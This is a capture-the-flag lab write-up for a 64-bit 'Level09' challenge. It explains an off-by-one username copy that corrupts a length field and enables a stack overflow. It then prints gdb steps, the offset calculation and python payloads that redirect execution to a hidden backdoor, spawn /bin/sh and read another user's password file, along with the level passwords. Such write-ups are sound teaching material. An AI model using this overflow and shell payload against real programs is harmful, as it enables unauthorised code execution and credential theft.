# Level09 - 64 bits -

## Local script usage

Requirements:

- `gdb-peda`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level07/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level09 | `GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8` |
| end     | `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

We can see a function `secret_backdoor` that is able to execute a given string. But this function is not called. We have to find a way to redirect the code.

The function used such as `fgets`, `strncpy` and `printf` are correctly used and not vulnerable.

But there is still a vulnerability: the function `set_username` fills 41 characters inside `msg.usr` instead 40 characters. As `msg` data are stored in a structure, data are contiguous. It means we are able to override the max length of the message. It is useful, because this length is used by `strncpy`. We are able to create an overflow.

First lets find the `secret_backdoor` address:

```shell
info function secret_backdoor
0x000055555555488c  secret_backdoor
```

Then, lets find the EIP address of the return of `handle_msg`

```shell
b*handle_msg+80 # before set_username
run
info frame
  Stack level 0, frame at 0x7fffffffe4e0: (...)
  rip at 0x7fffffffe4d8    # handle_msg return eip
```

And now, lets find the `msg` address, and calculate the offset with the EIP found

```shell
p $rbp-0xc0 # t_msg msg
  $1 = (void *) 0x7fffffffe410

p /d 0x7fffffffe4d8 - 0x7fffffffe410 # eip - msg
  $3 = 200 # offset
```

The offset is 200.

Our exploit will be something like:

```
USERNAME_INPUT: 'A' * 40 + (OFFSET + 8) # 8 bytes to write the x64 address
MESSAGE_INPUT:  'B' * OFFSET + SECRET_BACKDOOR_ADDRESS
BACKDOOR_INPUT: '/bin/sh'
```

Lets calculate the offset + 8 bytes in hexadecimal

```shell
p 200 + 8
  $2 = 0xd0
```

Perfect, we have everything we need

```shell
python -c "print 'A' * 40 + '\xd0'" > /tmp/exploit09
python -c "print 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" >> /tmp/exploit09
echo "/bin/sh" >> /tmp/exploit09

~/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Msg @Unix-Dude
>>: >: Msg sent!

$ whoami
  end
$ cat /home/users/end/.pass
  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## Sources

### C

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man memset](https://linux.die.net/man/3/memset)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man puts](https://linux.die.net/man/3/puts)
- [Man strncpy](https://linux.die.net/man/3/strncpy)
- [Man system](https://linux.die.net/man/3/system)
